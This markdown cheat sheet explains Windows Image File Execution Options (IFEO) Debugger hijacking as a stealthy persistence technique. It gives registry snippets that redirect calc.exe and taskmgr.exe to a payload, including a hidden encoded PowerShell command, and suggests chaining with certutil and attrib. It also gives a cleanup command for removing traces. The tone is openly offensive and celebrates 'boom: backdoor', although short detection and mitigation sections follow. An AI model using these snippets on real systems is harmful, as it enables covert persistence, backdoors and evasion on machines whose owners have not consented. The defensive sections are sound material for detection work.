# 🧠 Debugger Key Hijack (IFEO Injection) - Living Off the Land

**Image File Execution Options (IFEO) Debugger Hijacking** is a stealth persistence and execution technique where attackers modify registry keys to intercept program launches — rerouting execution to a **malicious payload** without touching startup folders or services.

> ⚠️ Used by malware like TrickBot and advanced red teamers. Highly effective, rarely monitored.

---

## 🛠️ What It Does
- Exploits the Windows Debugger mechanism to execute an alternative binary whenever a specific program is launched
- Can be used to hijack commonly run apps like `calc.exe`, `notepad.exe`, `taskmgr.exe`
- Also used to deploy malware during app troubleshooting

---

## 💣 Example: Hijack `calc.exe` to Launch a Backdoor
```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe]
"Debugger"="C:\Users\Public\payload.exe"
```
✅ Every time a user opens `calc.exe`, your payload runs instead — invisibly

---

## 🔁 Variants & Tactics

### 1. Hijack Common Tools (Persistence)
```reg
[HKEY_CURRENT_USER\...\taskmgr.exe]
"Debugger"="powershell -nop -w hidden -enc <base64>"
```
✅ Only works when user runs Task Manager — perfect for low-noise persistence

---

### 2. Chain With Other LoL Techniques
- Drop payload with `certutil`
- Hide it with `attrib`
- Trigger it via `IFEO` hijack — no scheduled task needed

---

### 3. Remove to Clean Up
```reg
reg delete "HKLM\...\calc.exe" /v Debugger /f
```
✅ Stealth red teams clean this up after execution to remove trace

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Registry writes to IFEO paths | Monitor keys under `HKLM\...\Image File Execution Options` |
| Legit apps spawning unknown payloads | Detect `calc.exe` → reverse shell, `notepad.exe` → meterpreter, etc. |
| Rare Debugger usage | Normal users/devs don’t use IFEO keys — any entry should be audited

---

## 🔐 Mitigation Strategies
- Monitor IFEO registry paths for unauthorized entries
- Use Sysmon/Event Logs to correlate app launches to payloads
- Restrict registry write access via GPO or endpoint hardening
- Regularly diff IFEO keys against baselines

---

> 🧠 This is sleeper persistence. No autoruns, no services — just wait for someone to open a common app and boom: backdoor. Underused, overpowered.
